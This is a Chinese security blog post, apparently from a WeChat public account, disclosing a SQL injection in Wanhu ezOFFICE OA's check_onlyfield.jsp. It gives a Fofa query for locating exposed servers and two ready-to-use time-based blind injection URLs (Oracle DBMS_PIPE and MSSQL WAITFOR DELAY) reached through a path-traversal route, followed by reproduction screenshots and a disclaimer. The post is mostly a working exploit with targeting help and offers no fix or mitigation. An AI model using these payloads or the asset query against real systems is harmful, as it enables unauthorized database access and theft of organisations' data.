#  【1day】万户OA check_onlyfield.jsp sql注入漏洞   
原创 十二  十二主神   2023-12-17 09:30  
  
**重要通知**  
  
师傅们，动动小手指，设个星标，灰常感谢  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BJUTXWkQqmC0yh3BpRx7Z8ibLmHlrfhmibN0Ppow5v7exvsoWJmgX18t7sLUkkg3TGzgwl2TWdjoJamRy9Xszy1w/640?wx_fmt=png&from=appmsg "")  
# 漏洞描述  
  
万户OA check_onlyfield.jsp sql注入漏洞，攻击者可通过此漏洞获取敏感信息。  
  
**资产测绘**  
```
Fofa：app="万户网络-ezOFFICE"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BJUTXWkQqmC0yh3BpRx7Z8ibLmHlrfhmibIcOIoK0Et3LjVGz9tsrehWwFhARcR875ULvjWva7XytZwy4eC8H0lg/640?wx_fmt=png&from=appmsg "")  
  
**漏洞POC**  
```
POC1
/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../platform/custom/custom_form/run/checkform/check_onlyfield.jsp?fieldId=1)+AND+9632=DBMS_PIPE.RECEIVE_MESSAGE(CHR(87)||CHR(65)||CHR(109)||CHR(70),3)+AND+(4917=4917

POC2
/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../platform/custom/custom_form/run/checkform/check_onlyfield.jsp?fieldId=1);WAITFOR+DELAY+'0:0:3'

```  
# 漏洞复现  
  
部分界面如下所示  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BJUTXWkQqmC0yh3BpRx7Z8ibLmHlrfhmibt9W27mKWEohGHPFOSwNxc6f1ZiaUS58kRIlrf2FJDd54ABFG04LSJOA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BJUTXWkQqmC0yh3BpRx7Z8ibLmHlrfhmibW1J8mbzYvwzAYSpaicSeqn7zUxtYa4rU3hz4p3KibvopwJGmJxXxbCPA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BJUTXWkQqmC0yh3BpRx7Z8ibLmHlrfhmib6eko8xn9MN50eDVhTLM9Exlg1E3ib1bLZBxxJaibbZibju8q1gu7Kar2Q/640?wx_fmt=png&from=appmsg "")  
  
**Nuclei脚本**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BJUTXWkQqmC0yh3BpRx7Z8ibLmHlrfhmibwNn0Xx3F7QEMqg4C9hgvObv7etu2L8gJoS5upz7nJESqB0Fpve0VJg/640?wx_fmt=png&from=appmsg "")  
<table><tbody style="outline: 0px;"><tr style="outline: 0px;"><td width="557" valign="top" style="outline: 0px;word-break: break-all;hyphens: auto;"><p style="outline: 0px;letter-spacing: 0.544px;color: rgb(34, 34, 34);"><strong style="outline: 0px;"><span style="outline: 0px;font-family: 宋体;color: red;">免责声明：</span></strong></p><p style="outline: 0px;"><span style="outline: 0px;font-family: 宋体;">  </span><span style="outline: 0px;font-size: 14px;">本文章仅做网络安全技术研究使用！严禁用于非法犯罪行为，请严格遵守国家法律法规；</span><span style="outline: 0px;color: rgb(0, 0, 0);font-size: 14px;letter-spacing: 0.544px;text-decoration-style: solid;text-decoration-color: rgb(255, 0, 0);">请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。<span style="outline: 0px;letter-spacing: 0.578px;">使用本文所提供的信息或工具即视为</span></span><span style="outline: 0px;font-size: 14px;letter-spacing: 0.544px;text-decoration-style: solid;text-decoration-color: rgb(255, 0, 0);color: rgb(0, 0, 0);">同意本免责声明</span><span style="outline: 0px;color: rgb(0, 0, 0);text-decoration-style: solid;text-decoration-color: rgb(255, 0, 0);font-size: 14px;letter-spacing: 0.578px;">，并承诺遵守相关法律法规和道德规范。</span><span style="outline: 0px;font-size: 14px;letter-spacing: 0.544px;">公众号发表的一切文章如有侵权烦请私信联系告知，我们会立即删除并对您表达最诚挚的歉意！感谢您的理解！</span></p><p><span style="outline: 0px;font-size: 14px;letter-spacing: 0.544px;"><br/></span></p></td></tr></tbody></table>  
